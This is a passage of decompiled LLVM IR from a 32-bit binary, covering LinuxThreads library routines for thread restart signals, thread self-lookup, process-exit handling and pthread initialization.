  %v2_805912f = ptrtoint i32* %stack_var_-148 to i32
  store i32 %v2_805912f, i32* @ebx, align 4
  %v2_8059136 = add i32 %arg1, 36
  %v3_8059136 = inttoptr i32 %v2_8059136 to i32*
  store i32 %v2_8059107, i32* %v3_8059136, align 4
  %v0_8059139 = load i32, i32* %edx.global-to-local, align 4
  %v1_8059139 = add i32 %v0_8059139, 32
  %v2_8059139 = inttoptr i32 %v1_8059139 to i32*
  store i32 0, i32* %v2_8059139, align 4
  %v1_8059141 = call i32 @sigemptyset(i32 %v2_805912f)
  store i32 1, i32* %edx.global-to-local, align 4
  %v0_8059148 = load i32, i32* @global_var_8075308.602, align 8
  %v2_805914f = call i32 @__GI_sigaddset(i32 %v2_805912f, i32 %v0_8059148)
  %v2_8059157 = ptrtoint i32* %stack_var_-276 to i32
  %v3_8059162 = bitcast i32* %stack_var_-148 to %_TYPEDEF_sigset_t*
  %v4_8059162 = call i32 @__GI_sigprocmask(i32 1, %_TYPEDEF_sigset_t* %v3_8059162, i32 %v2_8059157)
  %v2_805916e = ptrtoint i32* %stack_var_-12 to i32
  %v7_8059182 = mul nsw i64 %tmp5, 1000
  %v8_8059182 = trunc i64 %v7_8059182 to i32
  %v2_80591d5 = ptrtoint i32* %stack_var_-20 to i32
  %v1_805918d = add i32 %tmp7, 4
  %v2_805918d = inttoptr i32 %v1_805918d to i32*
  br label %dec_label_pc_805916a

dec_label_pc_805916a:                             ; preds = %dec_label_pc_80591d1, %dec_label_pc_8059121
  %v0_805916a = load i32, i32* @ecx, align 4
  %v4_8059176 = call i32 @gettimeofday(i32 %v2_805916e, i32 0, i32 %v0_805916a, i32 %v0_805916a)
  %v3_805918d = load i32, i32* %v2_805918d, align 4
  store i32 %v3_805918d, i32* %edx.global-to-local, align 4
  %v2_8059190 = load i32, i32* %arg2, align 4
  %v4_8059192 = load i32, i32* %stack_var_-12, align 4
  %v5_8059192 = sub i32 %v2_8059190, %v4_8059192
  %v2_8059199 = sub i32 %v3_805918d, %v8_8059182
  %v13_8059199 = icmp slt i32 %v2_8059199, 0
  store i32 %v2_8059199, i32* %edx.global-to-local, align 4
  %v1_80591ae = icmp eq i1 %v13_8059199, false
  br i1 %v1_80591ae, label %dec_label_pc_80591c7, label %dec_label_pc_80591b0

dec_label_pc_80591b0:                             ; preds = %dec_label_pc_805916a
  %v1_80591bd = add i32 %v5_8059192, -1
  br label %dec_label_pc_80591c7

dec_label_pc_80591c7:                             ; preds = %dec_label_pc_805916a, %dec_label_pc_80591b0
  %storemerge = phi i32 [ %v1_80591bd, %dec_label_pc_80591b0 ], [ %v5_8059192, %dec_label_pc_805916a ]
  %v3_80591c7 = phi i32 [ %v1_80591bd, %dec_label_pc_80591b0 ], [ %v5_8059192, %dec_label_pc_805916a ]
  store i32 %storemerge, i32* %stack_var_-20, align 4
  %v5_80591c7 = icmp slt i32 %v3_80591c7, 0
  br i1 %v5_80591c7, label %dec_label_pc_80591e9, label %dec_label_pc_80591d1

dec_label_pc_80591d1:                             ; preds = %dec_label_pc_80591c7
  %v2_80591dd = call i32 @__libc_nanosleep(i32 %v2_80591d5, i32 0)
  %v1_80591e5 = icmp eq i32 %v2_80591dd, 0
  %v1_80591e7 = icmp eq i1 %v1_80591e5, false
  br i1 %v1_80591e7, label %dec_label_pc_805916a, label %dec_label_pc_80591e9

dec_label_pc_80591e9:                             ; preds = %dec_label_pc_80591d1, %dec_label_pc_80591c7
  %v3_80591f6 = bitcast i32* %stack_var_-276 to %_TYPEDEF_sigset_t*
  %v4_80591f6 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_80591f6, i32 0)
  store i32 0, i32* @edx, align 4
  br label %dec_label_pc_8059200

dec_label_pc_8059200:                             ; preds = %entry.dec_label_pc_8059200_crit_edge, %dec_label_pc_80591e9
  %v2_8059207.pre-phi = phi i32* [ %.pre4, %entry.dec_label_pc_8059200_crit_edge ], [ %v3_8059136, %dec_label_pc_80591e9 ]
  store i32 %arg1, i32* @ecx, align 4
  store i32 0, i32* %v2_8059207.pre-phi, align 4
  %v0_8059214 = load i32, i32* @edx, align 4
  %v2_8059216 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8059216, i32* @ebx, align 4
  ret i32 %v0_8059214

; uselistorder directives
  uselistorder i32 %v1_80591bd, { 1, 0 }
  uselistorder i32 %v5_8059192, { 1, 0, 2 }
  uselistorder i32 (i32, i32)* @__libc_nanosleep, { 1, 0 }
  uselistorder i32 (i32, i32*)* @__sigsetjmp, { 1, 0 }
  uselistorder i32 %arg1, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_8059200, { 1, 0 }
  uselistorder label %dec_label_pc_80591c7, { 1, 0 }
}

define i32 @__pthread_restart_new(i32 %arg1) local_unnamed_addr {
entry:
  %v0_805921b = load i32, i32* @global_var_8075308.602, align 8
  %v1_8059225 = add i32 %arg1, 20
  %v2_8059225 = inttoptr i32 %v1_8059225 to i32*
  %v3_8059225 = load i32, i32* %v2_8059225, align 4
  %v2_8059228 = call i32 @kill(i32 %v3_8059225, i32 %v0_805921b)
  ret i32 %v2_8059228
}

define i32 @__pthread_wait_for_restart_signal(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8059231 = load i32, i32* @esi, align 4
  %v0_8059232 = load i32, i32* @ebx, align 4
  store i32 %v0_8059232, i32* %stack_var_-8, align 4
  %v2_8059239 = ptrtoint i32* %stack_var_-136 to i32
  store i32 %v2_8059239, i32* @ebx, align 4
  store i32 %arg1, i32* @esi, align 4
  %v4_8059249 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* null, i32 %v2_8059239)
  %v1_8059257 = call i32 @__GI_sigdelset(i32 %v2_8059239)
  %v0_805925f = load i32, i32* @esi, align 4
  %v1_805925f = add i32 %v0_805925f, 32
  %v2_805925f = inttoptr i32 %v1_805925f to i32*
  store i32 0, i32* %v2_805925f, align 4
  %v1_805926e = bitcast i32* %stack_var_-136 to %_TYPEDEF_sigset_t*
  br label %dec_label_pc_8059266

dec_label_pc_8059266:                             ; preds = %dec_label_pc_8059266, %entry
  %v2_805926e = call i32 @__libc_sigsuspend(%_TYPEDEF_sigset_t* %v1_805926e)
  %v0_8059273 = load i32, i32* @esi, align 4
  %v1_8059273 = add i32 %v0_8059273, 32
  %v2_8059273 = inttoptr i32 %v1_8059273 to i32*
  %v3_8059273 = load i32, i32* %v2_8059273, align 4
  %v1_8059279 = load i32, i32* @global_var_8075308.602, align 8
  %v12_8059279 = icmp eq i32 %v3_8059273, %v1_8059279
  %v1_805927f = icmp eq i1 %v12_8059279, false
  br i1 %v1_805927f, label %dec_label_pc_8059266, label %dec_label_pc_8059281

dec_label_pc_8059281:                             ; preds = %dec_label_pc_8059266
  %v2_8059287 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8059287, i32* @ebx, align 4
  store i32 %v0_8059231, i32* @esi, align 4
  ret i32 %v3_8059273

; uselistorder directives
  uselistorder i32 %v3_8059273, { 1, 0 }
  uselistorder i32 %v2_8059239, { 1, 0, 2 }
  uselistorder i32 (%_TYPEDEF_sigset_t*)* @__libc_sigsuspend, { 1, 0 }
}

define i32 @suspend.6() local_unnamed_addr {
entry:
  %v0_805928d = load i32, i32* @eax, align 4
  %v1_805928e = call i32 @__pthread_wait_for_restart_signal(i32 %v0_805928d)
  ret i32 %v1_805928e
}

define i32 @__pthread_find_self() local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v1_8059297 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_8059297, i32* @ecx, align 4
  br label %dec_label_pc_80592a3

dec_label_pc_80592a0:                             ; preds = %dec_label_pc_80592aa, %dec_label_pc_80592a3
  %v1_80592a0 = add i32 %v0_80592a0, 16
  br label %dec_label_pc_80592a3

dec_label_pc_80592a3:                             ; preds = %entry, %dec_label_pc_80592a0
  %v0_80592a0 = phi i32 [ ptrtoint (i32* @global_var_8070f40.608 to i32), %entry ], [ %v1_80592a0, %dec_label_pc_80592a0 ]
  store i32 %v0_80592a0, i32* @edx, align 4
  %v1_80592a3 = add i32 %v0_80592a0, 8
  %v2_80592a3 = inttoptr i32 %v1_80592a3 to i32*
  %v3_80592a3 = load i32, i32* %v2_80592a3, align 4
  %v6_80592a8 = icmp ugt i32 %v1_8059297, %v3_80592a3
  br i1 %v6_80592a8, label %dec_label_pc_80592a0, label %dec_label_pc_80592aa

dec_label_pc_80592aa:                             ; preds = %dec_label_pc_80592a3
  %v2_80592aa = add i32 %v0_80592a0, 12
  %v3_80592aa = inttoptr i32 %v2_80592aa to i32*
  %v4_80592aa = load i32, i32* %v3_80592aa, align 4
  %v10_80592aa = icmp ult i32 %v1_8059297, %v4_80592aa
  br i1 %v10_80592aa, label %dec_label_pc_80592a0, label %dec_label_pc_80592af

dec_label_pc_80592af:                             ; preds = %dec_label_pc_80592aa
  ret i32 %v3_80592a3

; uselistorder directives
  uselistorder i32 %v0_80592a0, { 1, 2, 3, 0 }
  uselistorder i32 %v1_8059297, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80592a3, { 1, 0 }
}

define i32 @thread_self.7(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_2096672 = alloca i32, align 4
  %v0_80592b0 = load i32, i32* @esp, align 4
  %v1_80592b0 = load i32, i32* @global_var_8079c4c.565, align 4
  %v7_80592b0 = icmp ult i32 %v0_80592b0, %v1_80592b0
  %v1_80592bd = icmp eq i1 %v7_80592b0, false
  br i1 %v1_80592bd, label %dec_label_pc_80592ee, label %dec_label_pc_80592bf

dec_label_pc_80592bf:                             ; preds = %entry
  %v1_80592bf = load i32, i32* @global_var_8079c50.566, align 16
  %v7_80592bf = icmp ult i32 %v0_80592b0, %v1_80592bf
  br i1 %v7_80592bf, label %dec_label_pc_80592d4, label %dec_label_pc_80592c7

dec_label_pc_80592c7:                             ; preds = %dec_label_pc_80592bf
  %v1_80592c7 = load i32, i32* @global_var_8079c54.567, align 4
  %v7_80592c7 = icmp ult i32 %v0_80592b0, %v1_80592c7
  br i1 %v7_80592c7, label %dec_label_pc_80592ee, label %dec_label_pc_80592d4

dec_label_pc_80592d4:                             ; preds = %dec_label_pc_80592c7, %dec_label_pc_80592bf
  %v0_80592d4 = load i32, i32* @global_var_807f358.569, align 8
  %v1_80592d4 = icmp eq i32 %v0_80592d4, 0
  br i1 %v1_80592d4, label %dec_label_pc_80592e2, label %dec_label_pc_80592dd

dec_label_pc_80592dd:                             ; preds = %dec_label_pc_80592d4
  %v0_80592dd = call i32 @__pthread_find_self()
  br label %dec_label_pc_80592e2

dec_label_pc_80592e2:                             ; preds = %dec_label_pc_80592d4, %dec_label_pc_80592dd
  %v2_80592e8 = ptrtoint i32* %stack_var_2096672 to i32
  br label %dec_label_pc_80592ee

dec_label_pc_80592ee:                             ; preds = %dec_label_pc_80592c7, %entry, %dec_label_pc_80592e2
  %v0_80592ee = phi i32 [ ptrtoint (i32* @global_var_8075120.568 to i32), %dec_label_pc_80592c7 ], [ ptrtoint (i32* @global_var_8074f40 to i32), %entry ], [ %v2_80592e8, %dec_label_pc_80592e2 ]
  ret i32 %v0_80592ee

; uselistorder directives
  uselistorder label %dec_label_pc_80592ee, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80592e2, { 1, 0 }
}

define i32 @pthread_onexit_process(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-188 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %v0_80592ef = load i32, i32* @ebx, align 4
  %v0_80592f6 = load i32, i32* @global_var_8075304.574, align 4
  %v2_80592f6 = icmp slt i32 %v0_80592f6, 0
  br i1 %v2_80592f6, label %entry.dec_label_pc_805937c_crit_edge, label %dec_label_pc_80592ff

entry.dec_label_pc_805937c_crit_edge:             ; preds = %entry
  %v0_8059383.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_805937c

dec_label_pc_80592ff:                             ; preds = %entry
  %v1_80592ff = call i32 @thread_self.7(i32 %v0_80592ef)
  store i32 %v1_80592ff, i32* @ebx, align 4
  store i32 %v1_80592ff, i32* %stack_var_-152, align 4
  %v2_805931d = ptrtoint i32* %stack_var_-152 to i32
  br label %dec_label_pc_805931d

dec_label_pc_805931d:                             ; preds = %dec_label_pc_8059339, %dec_label_pc_80592ff
  %v0_8059328 = load i32, i32* @global_var_8075304.574, align 4
  store i32 %v0_8059328, i32* %stack_var_-188, align 4
  %v3_805932e = call i32 @__libc_write(i32 %v0_8059328, i32 %v2_805931d, i32 148)
  %v8_8059336 = icmp eq i32 %v3_805932e, -1
  %v1_8059337 = icmp eq i1 %v8_8059336, false
  br i1 %v1_8059337, label %dec_label_pc_8059343, label %dec_label_pc_8059339

dec_label_pc_8059339:                             ; preds = %dec_label_pc_805931d
  %v0_8059339 = load i32, i32* %stack_var_-188, align 4
  %v1_8059339 = call i32 @__errno_location(i32 %v0_8059339)
  %v1_805933e = inttoptr i32 %v1_8059339 to i32*
  %v2_805933e = load i32, i32* %v1_805933e, align 4
  %v11_805933e = icmp eq i32 %v2_805933e, 4
  br i1 %v11_805933e, label %dec_label_pc_805931d, label %dec_label_pc_8059343

dec_label_pc_8059343:                             ; preds = %dec_label_pc_8059339, %dec_label_pc_805931d
  %v0_8059343 = load i32, i32* @ebx, align 4
  store i32 %v0_8059343, i32* @eax, align 4
  %v0_8059345 = call i32 @suspend.6()
  %v0_805934a = load i32, i32* @ebx, align 4
  %v1_805934a = load i32, i32* bitcast (i32** @global_var_8075300.575 to i32*), align 256
  %v12_805934a = icmp eq i32 %v0_805934a, %v1_805934a
  %v1_8059350 = icmp eq i1 %v12_805934a, false
  br i1 %v1_8059350, label %dec_label_pc_8059343.dec_label_pc_805937c_crit_edge, label %dec_label_pc_8059352

dec_label_pc_8059343.dec_label_pc_805937c_crit_edge: ; preds = %dec_label_pc_8059343
  br label %dec_label_pc_805937c

dec_label_pc_8059352:                             ; preds = %dec_label_pc_8059343
  %v0_805935a = load i32, i32* @global_var_8075134.571, align 4
  store i32 %v0_805935a, i32* %stack_var_-188, align 4
  %v3_8059360 = call i32 @waitpid(i32 %v0_805935a, i32 0, i32 -2147483648)
  store i32 0, i32* @global_var_8079c54.567, align 4
  store i32 0, i32* @global_var_8079c50.566, align 16
  br label %dec_label_pc_805937c

dec_label_pc_805937c:                             ; preds = %entry.dec_label_pc_805937c_crit_edge, %dec_label_pc_8059343.dec_label_pc_805937c_crit_edge, %dec_label_pc_8059352
  %v0_8059383 = phi i32 [ %v0_8059345, %dec_label_pc_8059343.dec_label_pc_805937c_crit_edge ], [ %v0_8059383.pre, %entry.dec_label_pc_805937c_crit_edge ], [ %v3_8059360, %dec_label_pc_8059352 ]
  store i32 %v0_80592ef, i32* @ebx, align 4
  ret i32 %v0_8059383

; uselistorder directives
  uselistorder i32* %stack_var_-152, { 1, 0 }
  uselistorder i32* %stack_var_-188, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805937c, { 2, 1, 0 }
}

define i32 @__GI_pthread_self(i32 %arg1) local_unnamed_addr {
entry:
  %v1_8059384 = call i32 @thread_self.7(i32 ptrtoint (i32* @0 to i32))
  %v1_8059389 = add i32 %v1_8059384, 16
  %v2_8059389 = inttoptr i32 %v1_8059389 to i32*
  %v3_8059389 = load i32, i32* %v2_8059389, align 4
  ret i32 %v3_8059389
}

define i32 @__pthread_reset_main_thread() local_unnamed_addr {
entry:
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_805938d = load i32, i32* @ebx, align 4
  store i32 %v0_805938d, i32* %stack_var_-4, align 4
  %v1_8059391 = call i32 @thread_self.7(i32 %v0_805938d)
  %v0_8059396 = load i32, i32* @global_var_8075304.574, align 4
  %v10_8059396 = icmp eq i32 %v0_8059396, -1
  store i32 %v1_8059391, i32* @ebx, align 4
  br i1 %v10_8059396, label %dec_label_pc_80593f2, label %dec_label_pc_80593a1

dec_label_pc_80593a1:                             ; preds = %entry
  %v0_80593a4 = load i32, i32* @global_var_8079c50.566, align 16
  %v1_80593aa = call i32 @free(i32 %v0_80593a4)
  store i32 0, i32* @global_var_8079c54.567, align 4
  %v0_80593ba = load i32, i32* @global_var_8075304.574, align 4
  store i32 0, i32* @global_var_8079c50.566, align 16
  %v1_80593ca = call i32 @__libc_close(i32 %v0_80593ba)
  %v0_80593d0 = load i32, i32* @global_var_807f370.609, align 16
  %v1_80593d6 = call i32 @__libc_close(i32 %v0_80593d0)
  store i32 -1, i32* @global_var_807f370.609, align 16
  store i32 -1, i32* @global_var_8075304.574, align 4
  br label %dec_label_pc_80593f2

dec_label_pc_80593f2:                             ; preds = %entry, %dec_label_pc_80593a1
  %v0_80593f2 = phi i32 [ %tmp3, %entry ], [ %v0_80593d0, %dec_label_pc_80593a1 ]
  %v1_80593f2 = call i32 @__libc_getpid(i32 %v0_80593f2)
  %v1_80593f7 = load i32, i32* @ebx, align 4
  %v2_80593f7 = add i32 %v1_80593f7, 20
  %v3_80593f7 = inttoptr i32 %v2_80593f7 to i32*
  store i32 %v1_80593f2, i32* %v3_80593f7, align 4
  %v0_80593fa = load i32, i32* @ebx, align 4
  store i32 %v0_80593fa, i32* bitcast (i32** @global_var_8075300.575 to i32*), align 256
  %v2_8059400 = inttoptr i32 %v0_80593fa to i32*
  store i32 %v0_80593fa, i32* %v2_8059400, align 4
  %v0_8059402 = load i32, i32* @ebx, align 4
  %v2_8059402 = add i32 %v0_8059402, 4
  %v3_8059402 = inttoptr i32 %v2_8059402 to i32*
  store i32 %v0_8059402, i32* %v3_8059402, align 4
  %v0_8059405 = load i32, i32* @ebx, align 4
  %v1_8059405 = add i32 %v0_8059405, 68
  %v2_8059405 = inttoptr i32 %v1_8059405 to i32*
  store i32 ptrtoint (i32* @global_var_807bcb8.610 to i32), i32* %v2_8059405, align 4
  %v0_805940c = load i32, i32* @ebx, align 4
  %v1_805940c = add i32 %v0_805940c, 76
  %v2_805940c = inttoptr i32 %v1_805940c to i32*
  store i32 ptrtoint (i32* @global_var_807bcbc.611 to i32), i32* %v2_805940c, align 4
  %v2_8059415 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8059415, i32* @ebx, align 4
  ret i32 %v1_80593f2

; uselistorder directives
  uselistorder i32 %v0_8059402, { 1, 0 }
  uselistorder i32 %v0_80593fa, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80593f2, { 1, 0 }
}

define i32 @__pthread_kill_other_threads_np() local_unnamed_addr {
entry:
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-140 = alloca i32, align 4
  %v2_8059422 = call i32 @pthread_onexit_process(i32 0, i32 0)
  %v0_8059427 = call i32 @__pthread_reset_main_thread()
  %v2_805942d = ptrtoint i32* %stack_var_-140 to i32
  %v2_8059431 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_8059431, i32* @ebx, align 4
  %v1_8059436 = call i32 @sigemptyset(i32 %v2_805942d)
  store i32 0, i32* %stack_var_-144, align 4
  %v0_8059454 = load i32, i32* @global_var_8075308.602, align 8
  %v4_805945a = call i32 @__libc_sigaction(i32 %v0_8059454, i32* nonnull %stack_var_-144, i32 0)
  %v0_8059465 = load i32, i32* @global_var_807530c.586, align 4
  %v4_805946b = call i32 @__libc_sigaction(i32 %v0_8059465, i32* nonnull %stack_var_-144, i32 0)
  %v0_8059470 = load i32, i32* @global_var_8075310.577, align 16
  %tmp12 = icmp slt i32 %v0_8059470, 1
  br i1 %tmp12, label %dec_label_pc_8059489, label %dec_label_pc_805947c

dec_label_pc_805947c:                             ; preds = %entry
  %v4_8059481 = call i32 @__libc_sigaction(i32 %v0_8059470, i32* nonnull %stack_var_-144, i32 0)
  br label %dec_label_pc_8059489

dec_label_pc_8059489:                             ; preds = %entry, %dec_label_pc_805947c
  %v0_8059490 = phi i32 [ %v0_8059470, %entry ], [ %v4_8059481, %dec_label_pc_805947c ]
  ret i32 %v0_8059490

; uselistorder directives
  uselistorder i32 %v0_8059470, { 1, 2, 0 }
  uselistorder i32 ()* @__pthread_reset_main_thread, { 1, 0 }
  uselistorder label %dec_label_pc_8059489, { 1, 0 }
}

define i32 @pthread_initialize(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-6291456 = alloca i32, align 4
  %v0_8059491 = load i32, i32* @esi, align 4
  %v0_8059492 = load i32, i32* @ebx, align 4
  %v0_8059499 = load i32, i32* @global_var_8079c4c.565, align 4
  %v1_8059499 = icmp eq i32 %v0_8059499, 0
  %v1_80594a0 = icmp eq i1 %v1_8059499, false
  br i1 %v1_80594a0, label %dec_label_pc_805962b, label %dec_label_pc_80594a6

dec_label_pc_80594a6:                             ; preds = %entry
  %v4_80594ad = ptrtoint i32* %stack_var_-6291456 to i32
  store i32 %v4_80594ad, i32* %eax.global-to-local, align 4
  store i32 %v4_80594ad, i32* @global_var_8079c4c.565, align 4
  %v1_80594b7 = call i32 @__libc_getpid(i32 %v0_8059492)
  store i32 ptrtoint (i32* @global_var_807bcb8.610 to i32), i32* bitcast (i32** @global_var_8074f84.612 to i32*), align 4
  store i32 ptrtoint (i32* @global_var_807bcbc.611 to i32), i32* bitcast (i32** @global_var_8074f8c.613 to i32*), align 4
  store i32 0, i32* @global_var_8075430.614, align 16
  store i32 %v1_80594b7, i32* @global_var_8074f54.615, align 4
  %storemerge3 = load i32, i32* bitcast (i32** @global_var_80753fc.617 to i32*), align 4
  store i32 %storemerge3, i32* %eax.global-to-local, align 4
  %v1_80594f64 = icmp eq i32 %storemerge3, 0
  %v1_80594f811 = icmp eq i1 %v1_80594f64, false
  br i1 %v1_80594f811, label %dec_label_pc_80594e6, label %dec_label_pc_80594fa

dec_label_pc_80594e6:                             ; preds = %dec_label_pc_80594a6, %dec_label_pc_80594f3
  %v0_80594ec = phi i32 [ %storemerge, %dec_label_pc_80594f3 ], [ %storemerge3, %dec_label_pc_80594a6 ]
  %v1_80594e6 = add i32 %v0_80594ec, 52
  %v2_80594e6 = inttoptr i32 %v1_80594e6 to i32*
  %v3_80594e6 = load i32, i32* %v2_80594e6, align 4
  %v12_80594e6 = icmp eq i32 %v3_80594e6, 1
  br i1 %v12_80594e6, label %dec_label_pc_80594f3, label %dec_label_pc_80594ec

dec_label_pc_80594ec:                             ; preds = %dec_label_pc_80594e6
  store i32 0, i32* %v2_80594e6, align 4
  %v0_80594f3.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80594f3

dec_label_pc_80594f3:                             ; preds = %dec_label_pc_80594e6, %dec_label_pc_80594ec
  %v0_80594f3 = phi i32 [ %v0_80594ec, %dec_label_pc_80594e6 ], [ %v0_80594f3.pre, %dec_label_pc_80594ec ]
  %v1_80594f3 = add i32 %v0_80594f3, 32
  %v2_80594f3 = inttoptr i32 %v1_80594f3 to i32*
  %storemerge = load i32, i32* %v2_80594f3, align 4
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v1_80594f6 = icmp eq i32 %storemerge, 0
  %v1_80594f8 = icmp eq i1 %v1_80594f6, false
  br i1 %v1_80594f8, label %dec_label_pc_80594e6, label %dec_label_pc_80594f6.dec_label_pc_80594fa_crit_edge

dec_label_pc_80594f6.dec_label_pc_80594fa_crit_edge: ; preds = %dec_label_pc_80594f3
  br label %dec_label_pc_80594fa

dec_label_pc_80594fa:                             ; preds = %dec_label_pc_80594f6.dec_label_pc_80594fa_crit_edge, %dec_label_pc_80594a6
  %v2_80594fc = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v2_80594fc, i32* @ebx, align 4
  %v2_8059506 = call i32 @getrlimit(i32 3, i32 %v2_80594fc)
  store i32 %v2_8059506, i32* %eax.global-to-local, align 4
  %v1_805950b = call i32 @__GI_getpagesize(i32 3)
  %v2_8059518 = mul i32 %v1_805950b, 2
  store i32 %v2_8059518, i32* %eax.global-to-local, align 4
  %v2_805951a = sub i32 2097152, %v2_8059518
  %v3_805951c = load i32, i32* %stack_var_-16, align 4
  %tmp = icmp ugt i32 %v3_805951c, %v2_805951a
  br i1 %tmp, label %dec_label_pc_8059525, label %dec_label_pc_8059539

dec_label_pc_8059525:                             ; preds = %dec_label_pc_80594fa
  store i32 %v2_805951a, i32* %stack_var_-16, align 4
  %v6_8059531 = bitcast i32* %stack_var_-16 to %rlimit*
  %v7_8059531 = call i32 @__GI_setrlimit(i32 3, %rlimit* %v6_8059531, i32 %v2_8059518, i32 %v2_8059518)
  store i32 %v7_8059531, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8059539

dec_label_pc_8059539:                             ; preds = %dec_label_pc_80594fa, %dec_label_pc_8059525
  store i32 134584707, i32* %stack_var_-284, align 4
  %v2_8059544 = ptrtoint i32* %stack_var_-280 to i32
  store i32 %v2_8059544, i32* @ebx, align 4
  %v2_8059548 = ptrtoint i32* %stack_var_-284 to i32
  store i32 %v2_8059548, i32* @esi, align 4
  %v1_805954d = call i32 @sigemptyset(i32 %v2_8059544)
  store i32 %v1_805954d, i32* %eax.global-to-local, align 4
  %v0_8059563 = load i32, i32* @global_var_8075308.602, align 8
  %v5_8059569 = call i32 @__libc_sigaction(i32 %v0_8059563, i32* nonnull %stack_var_-284, i32 0)
  store i32 134584562, i32* %stack_var_-284, align 4
  store i32 %v2_8059548, i32* %eax.global-to-local, align 4
  %v0_8059578 = load i32, i32* @global_var_8075308.602, align 8
  %v2_805957f = call i32 @__GI_sigaddset(i32 %v2_8059544, i32 %v0_8059578)
  store i32 %v2_805957f, i32* %eax.global-to-local, align 4
  %v0_805958a = load i32, i32* @global_var_807530c.586, align 4
  %v5_8059590 = call i32 @__libc_sigaction(i32 %v0_805958a, i32* nonnull %stack_var_-284, i32 0)
  store i32 %v5_8059590, i32* %eax.global-to-local, align 4
  %v0_8059598 = load i32, i32* @global_var_8075310.577, align 16
  %tmp34 = icmp slt i32 %v0_8059598, 1
  br i1 %tmp34, label %dec_label_pc_80595c6, label %dec_label_pc_80595a1

dec_label_pc_80595a1:                             ; preds = %dec_label_pc_8059539
  store i32 134582507, i32* %stack_var_-284, align 4
  %v1_80595ad = call i32 @sigemptyset(i32 %v2_8059544)
  store i32 %v1_80595ad, i32* %eax.global-to-local, align 4
  %v0_80595b8 = load i32, i32* @global_var_8075310.577, align 16
  %v5_80595be = call i32 @__libc_sigaction(i32 %v0_80595b8, i32* nonnull %stack_var_-284, i32 0)
  store i32 %v5_80595be, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80595c6

dec_label_pc_80595c6:                             ; preds = %dec_label_pc_8059539, %dec_label_pc_80595a1
  %v2_80595c9 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_80595c9, i32* @ebx, align 4
  %v1_80595d1 = call i32 @sigemptyset(i32 %v2_80595c9)
  store i32 %v2_80595c9, i32* %eax.global-to-local, align 4
  %v0_80595d8 = load i32, i32* @global_var_8075308.602, align 8
  %v2_80595df = call i32 @__GI_sigaddset(i32 %v2_80595c9, i32 %v0_80595d8)
  store i32 %v2_80595df, i32* %eax.global-to-local, align 4
  %v4_80595ec = bitcast i32* %stack_var_-144 to %_TYPEDEF_sigset_t*
  %v5_80595ec = call i32 @__GI_sigprocmask(i32 0, %_TYPEDEF_sigset_t* %v4_80595ec, i32 0)
  store i32 %v5_80595ec, i32* %eax.global-to-local, align 4
  store i32 %v2_80595c9, i32* @esi, align 4
  %v1_80595fa = call i32 @__GI_sigdelset(i32 %v2_80595c9)
  store i32 %v2_80595c9, i32* %eax.global-to-local, align 4
  %v0_8059601 = load i32, i32* @global_var_807530c.586, align 4
  %v2_8059608 = call i32 @__GI_sigaddset(i32 %v2_80595c9, i32 %v0_8059601)
  store i32 %v2_8059608, i32* %eax.global-to-local, align 4
  %v5_8059615 = call i32 @__GI_sigprocmask(i32 1, %_TYPEDEF_sigset_t* %v4_80595ec, i32 0)
  store i32 %v5_8059615, i32* %eax.global-to-local, align 4
  store i32 1, i32* @ebx, align 4
  store i32 %v2_80595c9, i32* @esi, align 4
  %v2_8059623 = call i32 @on_exit(i32 134583023, i32 0)
  store i32 %v2_8059623, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805962b

dec_label_pc_805962b:                             ; preds = %entry, %dec_label_pc_80595c6
  %.0 = phi i32 [ undef, %entry ], [ %v2_8059623, %dec_label_pc_80595c6 ]
  store i32 %v0_8059492, i32* @ebx, align 4
  store i32 %v0_8059491, i32* @esi, align 4
  ret i32 %.0

; uselistorder directives
  uselistorder i32 %v2_80595c9, { 2, 4, 1, 5, 3, 6, 0, 7, 8 }
  uselistorder i32 %v2_805951a, { 1, 0 }
  uselistorder i32 %v2_8059518, { 3, 2, 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32* %stack_var_-284, { 0, 3, 1, 4, 2, 6, 5 }
  uselistorder i32* %eax.global-to-local, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 0, 1, 2, 19 }
  uselistorder i32 (i32)* @__GI_sigdelset, { 1, 0, 8, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 (i32, i32)* @__GI_sigaddset, { 2, 1, 0, 3, 4 }
  uselistorder i32 (i32, i32*, i32)* @__libc_sigaction, { 3, 4, 5, 0, 1, 2, 6 }
  uselistorder i32 (i32)* @sigemptyset, { 2, 1, 0, 5, 3, 4 }
  uselistorder i32* @global_var_807bcb8.610, { 1, 0 }
  uselistorder label %dec_label_pc_805962b, { 1, 0 }
